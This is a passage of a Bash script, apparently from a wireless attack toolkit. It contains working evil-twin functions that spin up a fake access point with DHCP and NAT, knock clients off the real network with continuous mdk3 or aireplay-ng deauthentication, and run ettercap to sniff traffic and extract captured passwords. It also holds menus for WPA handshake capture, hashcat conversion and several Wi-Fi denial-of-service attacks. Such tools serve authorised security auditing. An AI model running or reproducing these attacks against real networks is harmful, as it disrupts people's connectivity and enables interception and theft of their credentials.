	language_strings ${language} 115 "read"
}

function exec_et_onlyap_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	set_control_script
	launch_control_window

	echo
	language_strings ${language} 298 "yellow"
	language_strings ${language} 115 "read"

	kill_et_windows
	restore_et_interface
}

function exec_et_sniffing_attack() {

	set_hostapd_config
	launch_fake_ap
	set_dhcp_config
	set_std_internet_routing_rules
	launch_dhcp_server
	exec_et_deauth
	launch_sniffing
	set_control_script
	launch_control_window

	echo
	language_strings ${language} 298 "yellow"
	language_strings ${language} 115 "read"

	kill_et_windows
	restore_et_interface
	if [ ${ettercap_log} -eq 1 ]; then
		parse_ettercap_log
	fi
}

function set_hostapd_config() {

	tmpfiles_toclean=1
	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	echo -e "interface=$interface" > "$tmpdir$hostapd_file"
	echo -e "driver=nl80211" >> "$tmpdir$hostapd_file"
	echo -e "ssid=$essid" >> "$tmpdir$hostapd_file"
	echo -e "channel=$channel" >> "$tmpdir$hostapd_file"
	echo -e "bssid=$et_bssid" >> "$tmpdir$hostapd_file"
}

function launch_fake_ap() {

	killall hostapd > /dev/null 2>&1
	${airmon} check kill > /dev/null 2>&1
	nm_processes_killed=1

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			hostapd_scr_window_position=${g1_topleft_window}
		;;
		"et_sniffing"|"et_captive_portal")
			hostapd_scr_window_position=${g3_topleft_window}
		;;
		"et_sniffing_sslstrip")
			hostapd_scr_window_position=${g4_topleft_window}
		;;
	esac
	xterm -hold -bg black -fg blue -geometry ${hostapd_scr_window_position} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 3
}

function set_dhcp_config() {

	route | grep ${ip_range} > /dev/null
	if [ "$?" != "0" ]; then
		et_ip_range=${ip_range}
		et_ip_router=${router_ip}
		et_broadcast_ip=${broadcast_ip}
		et_range_start=${range_start}
		et_range_stop=${range_stop}
	else
		et_ip_range=${alt_ip_range}
		et_ip_router=${alt_router_ip}
		et_broadcast_ip=${alt_broadcast_ip}
		et_range_start=${alt_range_start}
		et_range_stop=${alt_range_stop}
	fi

	tmpfiles_toclean=1
	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
	rm -rf "${tmpdir}clts.txt" > /dev/null 2>&1
	ifconfig ${interface} up

	echo -e "authoritative;" > "$tmpdir$dhcpd_file"
	echo -e "default-lease-time 600;" >> "$tmpdir$dhcpd_file"
	echo -e "max-lease-time 7200;" >> "$tmpdir$dhcpd_file"
	echo -e "subnet $et_ip_range netmask $std_c_mask {" >> "$tmpdir$dhcpd_file"
	echo -e "\toption broadcast-address $et_broadcast_ip;" >> "$tmpdir$dhcpd_file"
	echo -e "\toption routers $et_ip_router;" >> "$tmpdir$dhcpd_file"
	echo -e "\toption subnet-mask $std_c_mask;" >> "$tmpdir$dhcpd_file"
	echo -e "\toption domain-name-servers $dns1, $dns2;" >> "$tmpdir$dhcpd_file"
	echo -e "\trange $et_range_start $et_range_stop;" >> "$tmpdir$dhcpd_file"
	echo -e "}" >> "$tmpdir$dhcpd_file"

	leases_found=0
	for item in ${!possible_dhcp_leases_files[@]}; do
		if [ -f "${possible_dhcp_leases_files[$item]}" ]; then
			leases_found=1
			key_leases_found=${item}
			break
		fi
	done

	if [ ${leases_found} -eq 1 ]; then
		echo -e "lease-file-name \"${possible_dhcp_leases_files[$key_leases_found]}\";" >> "$tmpdir$dhcpd_file"
		chmod a+w "${possible_dhcp_leases_files[$key_leases_found]}" > /dev/null 2>&1
	else
		touch "${possible_dhcp_leases_files[0]}"
		echo -e "lease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "$tmpdir$dhcpd_file"
		chmod a+w "${possible_dhcp_leases_files[0]}" > /dev/null 2>&1
	fi

	dhcp_path="$tmpdir$dhcpd_file"
	if hash apparmor_status 2> /dev/null; then
		apparmor_status | grep dhcpd > /dev/null
		if [ "$?" = "0" ]; then
			if [ -d /etc/dhcpd ]; then
				cp "$tmpdir$dhcpd_file" /etc/dhcpd/ 2> /dev/null
				dhcp_path="/etc/dhcpd/$dhcpd_file"
			elif [ -d /etc/dhcp ]; then
				cp "$tmpdir$dhcpd_file" /etc/dhcp/ 2> /dev/null
				dhcp_path="/etc/dhcp/$dhcpd_file"
			else
				cp "$tmpdir$dhcpd_file" /etc/ 2> /dev/null
				dhcp_path="/etc/$dhcpd_file"
			fi
			dhcpd_path_changed=1
		fi
	fi
}

function set_std_internet_routing_rules() {

	routing_toclean=1
	ifconfig ${interface} ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
	echo "1" > /proc/sys/net/ipv4/ip_forward

	iptables -F
	iptables -t nat -F
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE
	iptables -A INPUT -p icmp --icmp-type 8 -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	iptables -A OUTPUT -p icmp --icmp-type 0 -s ${et_ip_router}/${ip_mask} -d ${et_ip_range}/${std_c_mask} -m state --state ESTABLISHED,RELATED -j ACCEPT
	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
	sleep 2
}

function launch_dhcp_server() {

	killall dhcpd > /dev/null 2>&1

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			dchcpd_scr_window_position=${g1_bottomleft_window}
		;;
		"et_sniffing"|"et_captive_portal")
			dchcpd_scr_window_position=${g3_middleleft_window}
		;;
		"et_sniffing_sslstrip")
			dchcpd_scr_window_position=${g4_middleleft_window}
		;;
	esac
	xterm -hold -bg black -fg pink -geometry ${dchcpd_scr_window_position} -T "DHCP" -e "dhcpd -d -cf \"$dhcp_path\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 2
}

function exec_et_deauth() {

	prepare_et_monitor

	case ${et_dos_attack} in
		"Mdk3")
			killall mdk3 > /dev/null 2>&1
			rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
			echo ${bssid} > ${tmpdir}"bl.txt"
			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b $tmpdir\"bl.txt\" -c $channel"
		;;
		"Aireplay")
			killall aireplay-ng > /dev/null 2>&1
			deauth_et_cmd="aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $iface_monitor_et_deauth"
		;;
		"Wds Confusion")
			killall mdk3 > /dev/null 2>&1
			deauth_et_cmd="mdk3 $iface_monitor_et_deauth w -e $essid -c $channel"
		;;
	esac

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			deauth_scr_window_position=${g1_bottomright_window}
		;;
		"et_sniffing"|"et_captive_portal")
			deauth_scr_window_position=${g3_bottomleft_window}
		;;
		"et_sniffing_sslstrip")
			deauth_scr_window_position=${g4_bottomleft_window}
		;;
	esac
	xterm -hold -bg black -fg red -geometry ${deauth_scr_window_position} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
	et_processes+=($!)
	sleep 1
}

function set_control_script() {

	rm -rf "$tmpdir$control_file" > /dev/null 2>&1

	exec 3>"$tmpdir$control_file"

	cat >&3 <<-'EOF'
		#!/bin/bash
		date_counter=`date +%s`
		while true; do
			echo
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[$language,4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip")
			local control_msg=${et_misc_texts[$language,5]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[$language,6]}
		;;
	esac

	cat >&3 <<-EOF
			echo -e "\t${yellow_color}${et_misc_texts[$language,0]}\n"
			echo -e "\t${blue_color}BSSID: ${normal_color}${bssid}"
			echo -e "\t${blue_color}ESSID: ${normal_color}${essid}"
			echo -e "\t${blue_color}${et_misc_texts[$language,1]}: ${normal_color}${channel}"
			echo
			echo -e "\t${green_color}${et_misc_texts[$language,2]}${normal_color}"
	EOF

	cat >&3 <<-'EOF'
			hours=$(date -u --date @$((`date +%s` - ${date_counter})) +%H)
			mins=$(date -u --date @$((`date +%s` - ${date_counter})) +%M)
			secs=$(date -u --date @$((`date +%s` - ${date_counter})) +%S)
			echo -e "\t$hours:$mins:$secs"
	EOF

	cat >&3 <<-EOF
			echo
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
			echo -e "\t${green_color}${et_misc_texts[$language,3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(cat "${tmpdir}clts.txt" | grep DHCPACK)
			client_ips=()
	EOF

	cat >&3 <<-'EOF'
			if [[ -z "${DHCPCLIENTS[@]}" ]]; then
	EOF

	cat >&3 <<-EOF
				echo -e "\t${et_misc_texts[$language,7]}"
			else
	EOF

	cat >&3 <<-'EOF'
				for client in "${DHCPCLIENTS[@]}"; do
					[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
					if [[ " ${client_ips[*]} " != *" $client_ip "* ]]; then
						client_hostname=""
						[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
						if [[ -z "$client_hostname" ]]; then
							echo -e "\t$client_ip $client_mac"
						else
							echo -e "\t$client_ip $client_mac $client_hostname"
						fi
					fi
					client_ips+=(${client_ip})
				done
			fi
			echo -ne "\033[K\033[u"
			sleep 0.3
		done
	EOF

	exec 3>&-
}

function launch_control_window() {

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing"|"et_captive_portal")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_sniffing_sslstrip")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	xterm -hold -bg black -fg white -geometry ${control_scr_window_position} -T "Control" -e "bash \"$tmpdir$control_file\"" > /dev/null 2>&1 &
	et_processes+=($!)
}

function launch_sniffing() {

	recalculate_windows_sizes
	case ${et_mode} in
		"et_sniffing")
			sniffing_scr_window_position=${g3_bottomright_window}
		;;
		"et_sniffing_sslstrip")
			sniffing_scr_window_position=${g4_middleright_window}
		;;
	esac
	ettercap_cmd="ettercap -i $interface -q -T -z -S -u"
	if [ ${ettercap_log} -eq 1 ]; then
		ettercap_cmd+=" -l $tmp_ettercaplog"
	fi

	xterm -hold -bg black -fg yellow -geometry ${sniffing_scr_window_position} -T "Sniffer" -e "$ettercap_cmd" > /dev/null 2>&1 &
	et_processes+=($!)
}

function parse_ettercap_log() {

	echo
	language_strings ${language} 304 "blue"

	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep "(")

	echo "" > "${tmpdir}parsed_file"
	echo $(date +%Y-%m-%d) >> "${tmpdir}parsed_file"
	echo ${et_misc_texts[$language,8]} >> "${tmpdir}parsed_file"
	echo "" >> "${tmpdir}parsed_file"
	echo "BSSID: $bssid" >> "${tmpdir}parsed_file"
	echo ${et_misc_texts[$language,1]}": $channel" >> "${tmpdir}parsed_file"
	echo "ESSID: $essid" >> "${tmpdir}parsed_file"
	echo "" >> "${tmpdir}parsed_file"
	echo "---------------" >> "${tmpdir}parsed_file"
	echo "" >> "${tmpdir}parsed_file"

	pass_counter=0
	for cpass in "${CAPTUREDPASS[@]}"; do
		echo ${cpass} >> "${tmpdir}parsed_file"
		pass_counter=$[pass_counter + 1]
	done

	if [ ${pass_counter} -eq 0 ]; then
		language_strings ${language} 305 "yellow"
	else
		language_strings ${language} 306 "blue"
		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
	fi

	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	language_strings ${language} 115 "read"
}

function kill_et_windows() {

	for item in ${et_processes[@]}; do
		kill ${item} &> /dev/null
	done
}

function convert_cap_to_hashcat_format() {

	tmpfiles_toclean=1
	rm -rf ${tmpdir}"hctmp"* > /dev/null 2>&1
	echo "1" | aircrack-ng "$enteredpath" -J ${tmpdir}"hctmp" -b ${bssid} > /dev/null 2>&1
	exec 5>&1
}

function handshake_tools_menu() {

	clear
	language_strings ${language} 120 "title"
	current_menu="handshake_tools_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	language_strings ${language} 49
	language_strings ${language} 124 "separator"
	language_strings ${language} 121
	print_simple_separator
	language_strings ${language} 122 clean_handshake_dependencies[@]
	print_simple_separator
	language_strings ${language} 123
	print_hint ${current_menu}

	read handshake_option
	case ${handshake_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			capture_handshake
		;;
		6)
			contains_element "$handshake_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				clean_handshake_file_option
			fi
		;;
		7)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_tools_menu
}

function exec_clean_handshake_file() {

	echo
	check_valid_file_to_clean ${filetoclean}
	if [ "$?" != "0" ]; then
		language_strings ${language} 159 "yellow"
	else
		wpaclean ${filetoclean} ${filetoclean} > /dev/null 2>&1
		language_strings ${language} 153 "yellow"
	fi
	language_strings ${language} 115 "read"
}

function clean_handshake_file_option() {

	echo
	readpath=0

	if [ -z "$enteredpath" ]; then
		language_strings ${language} 150 "blue"
		readpath=1
	else
		language_strings ${language} 151 "blue"
		ask_yesno 152
		if [ ${yesno} = "y" ]; then
			filetoclean="$enteredpath"
		else
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "$validpath" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	exec_clean_handshake_file
}

function dos_attacks_menu() {

	clear
	language_strings ${language} 102 "title"
	current_menu="dos_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	language_strings ${language} 49
	language_strings ${language} 50 "separator"
	language_strings ${language} 51 mdk3_attack_dependencies[@]
	language_strings ${language} 52 aireplay_attack_dependencies[@]
	language_strings ${language} 53 mdk3_attack_dependencies[@]
	language_strings ${language} 54 "separator"
	language_strings ${language} 62 mdk3_attack_dependencies[@]
	language_strings ${language} 63 mdk3_attack_dependencies[@]
	language_strings ${language} 64 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings ${language} 59
	print_hint ${current_menu}

	read dos_option
	case ${dos_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				mdk3_deauth_option
			fi
		;;
		6)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aireplay_deauth_option
			fi
		;;
		7)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				wds_confusion_option
			fi
		;;
		8)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				beacon_flood_option
			fi
		;;
		9)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				auth_dos_option
			fi
		;;
		10)
			contains_element "$dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				michael_shutdown_option
			fi
		;;
		11)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac
	
	dos_attacks_menu
}

function capture_handshake() {

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "$essid" = "(Hidden Network)" ]]; then
		echo
		language_strings ${language} 125 "yellow"
		language_strings ${language} 115 "read"
		explore_for_targets_option
	fi

	if [ "$?" != "0" ]; then
		return 1
	fi

	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
		echo
		language_strings ${language} 137 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi

	language_strings ${language} 126 "yellow"
	language_strings ${language} 115 "read"

	attack_handshake_menu "new"
}

function check_file_exists() {

	if [[ ! -f "$1" || -z "$1" ]]; then
		language_strings ${language} 161 "yellow"
		return 1
	fi
	return 0
}

function validate_path() {

	dirname=${1%/*}

	if [[ ! -d "$dirname" ]] || [[ "$dirname" = "." ]]; then
		language_strings ${language} 156 "yellow"
		return 1
	fi

	check_write_permissions "$dirname"
	if [ "$?" != "0" ]; then
		language_strings ${language} 157 "yellow"
		return 1
	fi

	lastcharmanualpath=${1: -1}
	if [ "$lastcharmanualpath" = "/" ]; then

		case ${2} in
			"handshake")
				enteredpath="$1$standardhandshake_filename"
				suggested_filename="$standardhandshake_filename"
			;;
			"hashcatpot")
				suggested_filename="$hashcatpot_filename"
				potenteredpath+="$hashcatpot_filename"
			;;
			"ettercaplog")
				suggested_filename="$default_ettercaplogfilename"
				ettercap_logpath="$ettercap_logpath$default_ettercaplogfilename"
			;;
		esac

		echo
		language_strings ${language} 155 "yellow"
		return 0
	fi

	language_strings ${language} 158 "yellow"
	return 0
}

function check_write_permissions() {

	if [ -w "$1" ]; then
		return 0
	fi
	return 1
}

function read_and_clean_path() {

	settings="$(shopt -p extglob)"
	shopt -s extglob

	read -r var
	local regexp='^[ '"'"']*(.*[^ '"'"'])[ '"'"']*$'
	[[ ${var} =~ $regexp ]] && var="${BASH_REMATCH[1]}"
	eval "$1=\$var"

	eval "${settings}"
}

function read_path() {

	echo
	case ${1} in
		"handshake")
			language_strings ${language} 148 "green"
			read_and_clean_path "enteredpath"
			if [ -z "$enteredpath" ]; then
				enteredpath="$handshakepath"
			fi
			validate_path "$enteredpath" ${1}
		;;
		"cleanhandshake")
			language_strings ${language} 154 "green"
			read_and_clean_path "filetoclean"
			check_file_exists "$filetoclean"
		;;
		"dictionary")
			language_strings ${language} 180 "green"
			read_and_clean_path "dictionary"
			check_file_exists "$dictionary"
		;;
		"targetfilefordecrypt")
			language_strings ${language} 188 "green"
			read_and_clean_path "enteredpath"
			check_file_exists "$enteredpath"
		;;
		"rules")
			language_strings ${language} 242 "green"
			read_and_clean_path "rules"
			check_file_exists "$rules"
		;;
		"hashcatpot")
			language_strings ${language} 233 "green"
			read_and_clean_path "potenteredpath"
			if [ -z "$potenteredpath" ]; then
				potenteredpath="$hashcat_potpath"
			fi
			validate_path "$potenteredpath" ${1}
		;;
		"ettercaplog")
			language_strings ${language} 303 "green"
			read_and_clean_path "ettercap_logpath"
			if [ -z "$ettercap_logpath" ]; then
				ettercap_logpath="$default_ettercap_logpath"
			fi
			validate_path "$ettercap_logpath" ${1}
		;;
	esac

	validpath="$?"
	return "$validpath"
}

function attack_handshake_menu() {

	if [ "$1" = "handshake" ]; then
		ask_yesno 145
		handshake_captured=${yesno}
		kill ${processidcapture} &> /dev/null
		if [ "$handshake_captured" = "y" ]; then

			handshakepath=`env | grep ^HOME | awk -F = '{print $2}'`
			lastcharhandshakepath=${handshakepath: -1}
			if [ "$lastcharhandshakepath" != "/" ]; then
				handshakepath="$handshakepath/"
			fi
			handshakefilename="handshake-$bssid.cap"
			handshakepath="$handshakepath$handshakefilename"

			language_strings ${language} 162 "yellow"
			validpath=1
			while [[ "$validpath" != "0" ]]; do
				read_path "handshake"
			done

			cp "$tmpdir$standardhandshake_filename" ${enteredpath}
			echo
			language_strings ${language} 149 "blue"
			language_strings ${language} 115 "read"
			return
		else
			echo
			language_strings ${language} 146 "yellow"
			language_strings ${language} 115 "read"
		fi
	fi

	clear
	language_strings ${language} 138 "title"
	current_menu="attack_handshake_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 139 mdk3_attack_dependencies[@]
	language_strings ${language} 140 aireplay_attack_dependencies[@]
	language_strings ${language} 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings ${language} 147
	print_hint ${current_menu}

	read attack_handshake_option
	case ${attack_handshake_option} in
		1)
			contains_element "$attack_handshake_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
				echo ${bssid} > ${tmpdir}"bl.txt"
				recalculate_windows_sizes
				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		2)
			contains_element "$attack_handshake_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				${airmon} start ${interface} ${channel} > /dev/null 2>&1
				recalculate_windows_sizes
				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1 &
				sleeptimeattack=12
			fi
		;;
		3)
			contains_element "$attack_handshake_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
				attack_handshake_menu "new"
			else
				capture_handshake_window
				recalculate_windows_sizes
				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1 &
				sleeptimeattack=16
			fi
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
			attack_handshake_menu "new"
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	attack_handshake_menu "handshake"
}

function capture_handshake_window() {

	language_strings ${language} 143 "blue"
	echo
	language_strings ${language} 144 "yellow"
	language_strings ${language} 115 "read"

	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} > /dev/null 2>&1 &
	processidcapture=$!
}

function explore_for_targets_option() {

	echo
	language_strings ${language} 103 "title"
	language_strings ${language} 65 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings ${language} 66 "yellow"
	echo
	language_strings ${language} 67 "yellow"
	language_strings ${language} 115 "read"

	tmpfiles_toclean=1
	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface} > /dev/null 2>&1
	targetline=`cat ${tmpdir}"nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	targetline=`expr ${targetline} - 1`

	head -n ${targetline} ${tmpdir}"nws-01.csv" &> ${tmpdir}"nws.csv"
	tail -n +${targetline} ${tmpdir}"nws-01.csv" &> ${tmpdir}"clts.csv"

	csvline=`wc -l ${tmpdir}"nws.csv" 2> /dev/null | awk '{print $1}'`
	if [ ${csvline} -le 3 ]; then
		echo
		language_strings ${language} 68 "yellow"
		language_strings ${language} 115 "read"
		return
	fi

	rm -rf ${tmpdir}"nws.txt" > /dev/null 2>&1
	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
	i=0
	while IFS=, read exp_mac exp_fts exp_lts exp_channel exp_speed exp_enc exp_cypher exp_auth exp_power exp_beacon exp_iv exp_lanip exp_idlength exp_essid exp_key; do

		chars_mac=${#exp_mac}
		if [ ${chars_mac} -ge 17 ]; then
			i=$(($i+1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=`expr ${exp_power} + 100`
				fi
			fi

			exp_power=`echo ${exp_power} | awk '{gsub(/ /,""); print}'`
			exp_essid=`expr substr "$exp_essid" 2 ${exp_idlength}`
			if [ ${exp_channel} -gt 14 ] || [ ${exp_channel} -lt 1 ]; then
				exp_channel=0
			else
				exp_channel=`echo ${exp_channel} | awk '{gsub(/ /,""); print}'`
			fi

			if [ "$exp_essid" = "" ] || [ "$exp_channel" = "-1" ]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=`echo ${exp_enc} | awk '{print $1}'`

			echo -e "$exp_mac,$exp_channel,$exp_power,$exp_essid,$exp_enc" >> ${tmpdir}"nws.txt"
		fi
	done < ${tmpdir}"nws.csv"
	sort -t "," -d -k 4 ${tmpdir}"nws.txt" > ${tmpdir}"wnws.txt"
	select_target
}

function select_target() {

	clear
	language_strings ${language} 104 "title"
	language_strings ${language} 69 "green"
	print_large_separator
	i=0
	while IFS=, read exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$(($i+1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2=" "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
		else
			sp2=""
		fi

		if [[ "$exp_power" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		client=`cat ${tmpdir}"clts.csv" | grep ${exp_mac}`
		if [ "$client" != "" ]; then
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ ${enc_length} -gt 3 ]; then
			sp6=""
		elif [ ${enc_length} -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e " $sp1$i)$client  $sp5$exp_mac   $sp2$exp_channel    $sp4$exp_power%   $exp_enc$sp6   $exp_essid"
	done < ${tmpdir}"wnws.txt"

	echo
	if [ ${i} -eq 1 ]; then
		language_strings ${language} 70 "yellow"
		selected_target_network=1
		language_strings ${language} 115 "read"
	else
		language_strings ${language} 71
		print_large_separator
		language_strings ${language} 3 "green"
		read selected_target_network
	fi

	while [[ ${selected_target_network} -lt 1 ]] || [[ ${selected_target_network} -gt ${i} ]]; do
		echo
		language_strings ${language} 72 "yellow"
		echo
		language_strings ${language} 3 "green"
		read selected_target_network
	done

	essid=${network_names[$selected_target_network]}
	channel=${channels[$selected_target_network]}
	bssid=${macs[$selected_target_network]}
	enc=${encs[$selected_target_network]}
}

function et_prerequisites() {

	current_menu="evil_twin_attacks_menu"

	case ${et_mode} in
		"et_onlyap")
			clear
			language_strings ${language} 270 "title"
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
			print_hint ${current_menu}
			echo
			language_strings ${language} 275 "blue"
			echo
			language_strings ${language} 276 "yellow"
			print_simple_separator
			ask_yesno 277
			if [ ${yesno} = "n" ]; then
				return_to_et_main_menu=1
				return
			fi
			ask_bssid
			ask_channel
			ask_essid
			return_to_et_main_menu=1
			echo
			language_strings ${language} 296 "yellow"
			language_strings ${language} 115 "read"
			prepare_et_interface
			exec_et_onlyap_attack
		;;
		"et_sniffing")
			clear
			language_strings ${language} 291 "title"
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
			print_hint ${current_menu}
			echo
			language_strings ${language} 275 "blue"
			echo
			language_strings ${language} 276 "yellow"
			print_simple_separator
			ask_yesno 277
			if [ ${yesno} = "n" ]; then
				return_to_et_main_menu=1
				return
			fi
			ask_bssid
			ask_channel
			ask_essid
			manage_ettercap_log
			return_to_et_main_menu=1
			echo
			language_strings ${language} 296 "yellow"
			language_strings ${language} 115 "read"
			prepare_et_interface
			exec_et_sniffing_attack
		;;
		"et_sniffing_sslstrip")
			language_strings ${language} 292 "title"
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
			print_hint ${current_menu}
			#TODO: Evil Twin AP with sniffing and sslstrip
		;;
		"et_captive_portal")
			language_strings ${language} 293 "title"
			print_iface_selected
			print_et_target_vars
			print_hint ${current_menu}
			#TODO: Evil Twin AP with captive portal
		;;
	esac
}

function et_dos_menu() {

	if [ ${return_to_et_main_menu} -eq 1 ]; then
		return
	fi

	clear
	language_strings ${language} 265 "title"
	current_menu="et_dos_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 139 mdk3_attack_dependencies[@]
	language_strings ${language} 140 aireplay_attack_dependencies[@]
	language_strings ${language} 141 mdk3_attack_dependencies[@]
	print_simple_separator
	language_strings ${language} 266
	print_hint ${current_menu}

	read et_dos_option
	case ${et_dos_option} in
		1)
			contains_element "$et_dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Mdk3"
				detect_internet_interface
				if [ "$?" = "0" ]; then
					et_prerequisites
				else
					return
				fi
			fi
		;;
		2)
			contains_element "$et_dos_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				et_dos_attack="Aireplay"
